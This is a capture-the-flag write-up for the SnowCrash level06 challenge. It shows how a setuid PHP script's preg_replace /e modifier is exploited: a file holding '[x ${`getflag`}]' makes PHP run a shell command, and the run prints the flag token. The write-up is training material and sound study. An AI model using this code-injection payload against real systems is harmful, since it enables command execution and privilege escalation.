checking the files we get

```bash
level06@SnowCrash:~$ ls -la
total 24
dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
level06@SnowCrash:~$ cat level06.php 
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

Here we can see running 1- the level06 exec has s as their exec permit and is 
owned by flag06

the php file runs some code. Let's look at it closer. A little refactoring we get

```php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m; 
}
function x($y, $z) {
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```

we can see that.

1. The function x is called with the 2 parameters argv given
2. preg_replace all over the place but notice the one that has /e
3. The first argument is a file that has getcontents
4. the "y" function is run on the "second" level of replacement

to exploit that we do call a variable name with backticks that will run in bash 
to look for the variable name. We will exploit that vulnerability

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' >uu4
level06@SnowCrash:~$ ./level06  uu4
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```


